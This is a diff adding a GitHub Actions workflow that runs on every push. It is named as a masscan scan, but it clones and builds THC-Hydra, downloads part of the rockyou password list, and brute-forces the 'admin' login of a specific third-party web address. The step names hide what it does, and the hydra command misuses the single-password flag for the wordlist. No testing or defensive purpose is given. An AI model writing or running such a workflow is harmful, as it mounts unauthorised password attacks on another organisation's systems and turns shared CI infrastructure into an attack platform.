@@ -1,0 +1,28 @@
+name: masscan_ip_scan
+
+on: [push]
+
+jobs:
+  install-tools:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v2
+      with:
+        terminal: false
+
+    - name: Install Masscan
+      run: |
+        git clone https://github.com/vanhauser-thc/thc-hydra
+        ls
+        echo "--------------"
+        cd thc-hydra
+        ./configure
+        make
+        make install
+        wget https://github.com/josuamarcelc/common-password-list/raw/main/rockyou.txt/rockyou_1.txt
+        hydra -l admin -p rockyou_1.txt https://direct-tms.linecorp.com/stats/
+        
+
+        
